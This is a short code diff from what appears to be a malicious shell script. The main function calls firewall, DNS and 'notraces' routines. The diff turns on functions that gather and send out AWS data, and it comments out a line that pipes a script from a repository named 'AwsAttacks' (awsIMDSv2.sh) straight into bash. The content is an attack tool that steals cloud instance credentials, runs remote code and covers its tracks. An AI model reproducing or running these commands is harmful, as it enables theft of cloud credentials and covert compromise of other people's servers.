@@ -31,9 +31,9 @@ int_main(){
 fwall
 dns_opt
 
-#get_aws_data
-#send_aws_data
-curl -Lk https://raw.githubusercontent.com/SoOM3a/AwsAttacks/main/awsIMDSv2.sh | bash
+get_aws_data
+send_aws_data
+#curl -Lk https://raw.githubusercontent.com/SoOM3a/AwsAttacks/main/awsIMDSv2.sh | bash
 notraces
 }
 
